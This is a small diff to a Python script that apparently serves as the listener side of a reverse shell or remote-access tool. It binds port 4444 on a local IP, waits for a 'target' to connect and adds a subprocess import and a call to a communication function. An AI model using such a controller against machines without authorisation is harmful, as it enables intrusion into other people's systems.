@@ -1,6 +1,7 @@
 import os
 import socket
 import json
+import subprocess
 from termcolor import colored
 
 #Funcionalities
@@ -80,9 +81,9 @@ def t_commun():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(('192.168.100.201', 4444))
-print(colored('Waiting for connections[...]', 'red'))
+print(colored('[-]Waiting for connections...', 'red'))
 sock.listen(5)
 
 target, ip = sock.accept()
 print(colored('+ Connected with: ' + str(ip), 'green'))
-
+t_commun()
